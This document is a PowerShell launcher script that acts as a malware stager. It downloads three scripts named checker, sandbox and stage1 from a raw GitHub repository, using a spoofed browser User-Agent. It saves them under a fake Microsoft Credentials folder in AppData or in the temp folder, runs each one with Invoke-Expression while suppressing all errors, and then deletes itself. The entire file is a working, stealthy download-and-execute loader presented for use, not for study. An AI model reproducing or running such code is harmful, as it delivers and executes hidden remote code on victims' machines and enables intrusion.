# launcher.ps1 - Chains checker → sandbox → stage1

$ErrorActionPreference = 'SilentlyContinue'
$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
$desktop = [System.Environment]::GetFolderPath('Desktop')
$basePath = "$appData\Microsoft\Credentials"

# === Fetch scripts from GitHub ===
$repo = "https://raw.githubusercontent.com/slynet999-coder/Yambo/main"
$scripts = @("checker.ps1", "sandbox.ps1", "stage1.ps1")

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

    foreach ($script in $scripts) {
        $url = "$repo/$script"
        $path = "$basePath\$script"
        
        try {
            $wc.DownloadFile($url, $path)
        } catch {
            # Fallback to temp
            $path = "$env:TEMP\$script"
            $wc.DownloadFile($url, $path)
        }
    }
} catch {}

# === Execute chain ===
foreach ($script in $scripts) {
    $path = "$basePath\$script"
    if (-not (Test-Path $path)) { $path = "$env:TEMP\$script" }
    
    if (Test-Path $path) {
        try {
            $content = [System.IO.File]::ReadAllText($path, [System.Text.Encoding]::UTF8)
            Invoke-Expression $content
        } catch {}
    }
}

# === Cleanup launcher ===
try { Remove-Item $MyInvocation.ScriptName -Force -ErrorAction SilentlyContinue } catch {}
